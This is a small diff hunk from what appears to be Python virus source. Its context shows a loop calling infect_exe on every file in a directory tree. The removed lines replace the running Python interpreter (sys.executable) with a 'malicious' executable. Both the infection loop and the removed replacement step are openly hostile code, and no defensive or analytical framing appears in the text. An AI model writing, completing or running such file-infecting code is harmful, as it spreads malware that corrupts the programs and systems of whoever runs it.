@@ -22,9 +22,5 @@ def main():
                 file_path = os.path.join(root, file)
                 infect_exe(file_path, executable_path)
 
-    # Replace the current executable with the malicious one
-    os.remove(sys.executable)
-    os.rename(executable_path, sys.executable)
-
 if __name__ == '__main__':
     main()
